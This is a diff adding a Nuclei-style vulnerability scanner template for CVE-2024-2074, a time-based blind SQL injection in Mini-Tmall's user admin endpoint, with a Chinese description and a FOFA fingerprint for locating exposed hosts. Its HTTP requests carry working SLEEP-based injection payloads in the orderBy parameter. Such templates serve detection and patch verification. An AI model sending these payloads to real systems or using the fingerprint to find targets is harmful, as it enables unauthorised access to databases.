@@ -1,0 +1,25 @@
+id: mini-tmall-sqli
+info:
+  name: "Mini-Tmall 用户管理接口 orderBy 参数 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: icon_hash="-2087517259"
+        Mini-Tmall 是基于 Spring Boot 构建的电子商务平台。在 20231017 及更早版本中，用户管理接口 ?r=tmall/admin/user/1/1 存在参数过滤缺陷，攻击者可通过构造恶意 orderBy 参数值实现 SQL 代码注入，进而获取数据库敏感数据或执行任意数据库操作。该漏洞源于后端对用户输入的排序参数缺乏有效验证，允许远程攻击者无需身份认证即可发起攻击。
+  reference:
+  - CVE-2024-2074
+  tags: Mini-Tmall
+http:
+- raw:
+  - |
+    GET /tmall/admin/user/1/1?orderBy=7,if((length(database())=11),SLEEP(5),0) HTTP/1.1
+    Host: {{Hostname}}
+  - |
+    GET /tmall/admin/user/1/1?orderBy=7,if((length(database())=11),SLEEP(8),0) HTTP/1.1
+    Host: {{Hostname}}
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
